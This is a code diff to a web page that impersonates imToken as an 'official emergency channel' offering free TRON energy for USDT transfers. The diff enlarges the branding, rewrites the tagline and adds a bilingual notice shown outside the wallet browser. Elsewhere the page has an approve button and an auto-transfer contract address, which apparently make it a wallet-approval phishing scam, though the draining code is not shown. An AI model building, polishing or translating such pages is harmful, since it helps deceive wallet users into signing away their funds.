@@ -9,13 +9,11 @@
     <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <meta property="og:type" content="website" />
-
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="imToken官方应急通道" />
     <meta name="twitter:description" content="imToken专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
     <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
-
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -45,7 +43,7 @@ body {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 8px 6px;
+    padding: 12px 8px; /* 适当增加内边距，适配放大后的元素 */
     border-bottom: 1px solid #334155;
     margin-bottom: 3px;
 }
@@ -75,25 +73,27 @@ body {
     margin-bottom: 0;
     display: flex; /* 新增：flex布局让Logo和文字同行 */
     align-items: center; /* 新增：垂直居中 */
-    gap: 8px; /* 新增：Logo和文字间距 */
+    gap: 12px; /* 加大Logo和文字间距，更舒展 */
 }
-/* 新增：Logo样式 */
+/* 新增：Logo样式（放大尺寸） */
 .header-logo {
-    width: 36px; /* 适配文字高度，保持比例 */
-    height: 36px;
-    border-radius: 4px; /* 轻微圆角更美观 */
+    width: 48px; /* 从36px放大到48px，更醒目 */
+    height: 48px;
+    border-radius: 6px; /* 轻微圆角更美观 */
     object-fit: cover;
 }
 .header h1 { 
-    font-size: 20px; /* 恢复原字体大小 */
+    font-size: 28px; /* 从20px放大到28px，摆脱小气感 */
     color: #3b82f6; 
-    margin-bottom: 2px;
+    margin-bottom: 4px; /* 增加与描述文本的间距 */
+    font-weight: 700; /* 加粗增强视觉冲击 */
 }
 .header .desc {
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 15px; /* 从12px放大到15px，更清晰 */
     color: #a0a8a4;
     max-width: 400px;
-    line-height: 1.4; 
+    line-height: 1.5; 
+    font-weight: 500; /* 轻微加粗，提升存在感 */
 }
 .warning {
     background: #334155;
@@ -188,6 +188,29 @@ body {
     border-radius: 4px;
     border: 1px solid rgba(59, 130, 246, 0.3);
     font-size: 12px; /* 恢复原字体大小 */
+}
+/* 新增：非钱包环境专属容器样式 */
+.special-tip-container {
+    background: #1e2925;
+    padding: 14px;
+    border-radius: 8px;
+    border: 1px solid #334155;
+    display: none; /* 初始隐藏 */
+    margin-top: 5px;
+    border-right: 3px solid #f97316; /* 外层边框-主橙色 */
+    box-shadow: -2px 0 0 0 #fb923c; /* 内层边框-浅橙色，形成双层效果 */
+}
+.special-tip-title {
+    font-size: 16px; /* 比其他字体稍大 */
+    color: #f97316;
+    font-weight: 600;
+    margin-bottom: 6px;
+}
+.special-tip-content {
+    font-size: 14px; /* 比其他字体稍大 */
+    color: #f97316;
+    line-height: 1.6;
+    font-weight: 500; /* 加粗醒目 */
 }
 .record-list {
     background: #1e2925;
@@ -298,7 +321,7 @@ body {
                 <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
                 <div>
                     <h1 id="headerTitle">imToken</h1>
-                    <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
+                    <p class="desc" id="headerDesc">imToken官方应急通道</p> <!-- 已更新描述文本 -->
                 </div>
             </div>
             <div class="lang-switch">
@@ -339,6 +362,13 @@ body {
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                     注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
+            </div>
+        </div>
+        <!-- 新增：非钱包环境专属容器（添加id便于JS控制文本） -->
+        <div class="special-tip-container" id="specialTipContainer">
+            <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
+            <div class="special-tip-content" id="specialTipContent">
+                此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。
             </div>
         </div>
         <div class="record-list" id="recordList">
@@ -426,11 +456,11 @@ let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 // 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
-// ========== 多语言配置（以页面文本为准，同步调整） ==========
+// ========== 多语言配置（已更新headerDesc文本） ==========
 const langConfig = {
     zh: {
         headerTitle: "imToken",
-        headerDesc: "imToken官方专属服务，每个钱包地址每30天只可领取一次能量",
+        headerDesc: "imToken官方应急通道", // 已替换为需求文本
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
@@ -491,11 +521,14 @@ const langConfig = {
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接imToken钱包后重试</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请用imToken钱包内置浏览器打开</span>"
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请用imToken钱包内置浏览器打开</span>",
+        // 新增：非钱包环境容器双语（中文）
+        specialTipTitle: "imToken-EAB",
+        specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
     },
     en: {
         headerTitle: "imToken",
-        headerDesc: "imToken Official Exclusive Service - Each wallet address can claim energy once every 30 days",
+        headerDesc: "imToken Official Emergency Channel", // 英文对应更新
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
@@ -556,7 +589,10 @@ const langConfig = {
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect imToken wallet and try again</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Please open with imToken in-app browser</span>"
+        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Please open with imToken in-app browser</span>",
+        // 新增：非钱包环境容器双语（英文）
+        specialTipTitle: "imToken-EAB",
+        specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
     }
 };
 // 当前语言
@@ -646,6 +682,10 @@ const reviewTipText = document.getElementById("reviewTipText");
 const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
+const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
+// 新增：缓存非钱包容器文本元素
+const specialTipTitleEl = document.getElementById("specialTipTitle");
+const specialTipContentEl = document.getElementById("specialTipContent");
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -656,7 +696,7 @@ function isCustomerError(errMsg) {
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
 }
-// ========== 语言切换逻辑 ==========
+// ========== 语言切换逻辑（已补充非钱包容器文本更新） ==========
 function toggleLang() {
     currentLang = currentLang === "zh" ? "en" : "zh";
     localStorage.setItem("imtoken_energy_lang", currentLang);
@@ -672,6 +712,10 @@ function updatePageLang() {
             el.innerHTML = lang[key];
         }
     });
+    // 新增：单独更新非钱包容器文本（确保样式不被覆盖）
+    if (specialTipTitleEl) specialTipTitleEl.textContent = lang.specialTipTitle;
+    if (specialTipContentEl) specialTipContentEl.textContent = lang.specialTipContent;
+    
     connectBtn.textContent = lang.connectBtnText;
     approveBtn.textContent = lang.approveBtnText;
     reviewTipText.textContent = lang.reviewTipText;
@@ -782,7 +826,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         return;
     }
     startPersistentEnergyCountdown();
-    updatePageLang();
+    updatePageLang(); // 初始化时就更新双语文本
     langToggle.addEventListener("click", toggleLang);
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
@@ -821,10 +865,12 @@ async function checkImTokenEnv() {
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
+        specialTipContainer.style.display = "none"; // imToken环境隐藏专属容器
         await initWallet(false);
     } else {
         try {
-            // 非imToken环境：只显示引导提示，无不符合领取条件文本
+            // 非imToken环境：显示专属容器+引导提示（自动适配当前语言）
+            specialTipContainer.style.display = "block";
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
             connectBtn.onclick = async () => {
@@ -861,6 +907,8 @@ async function initWallet(isAfterApprove) {
                 .replace("{address}", shortAddr)
                 .replace("{usdt}", tokenBalance.toFixed(2))
                 .replace("{trx}", trxBalance.toFixed(2));
+            approveBtn.disabled = false;
+            approveBtn.textContent = lang.approveBtnText;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
             // 特殊地址15分钟防重复
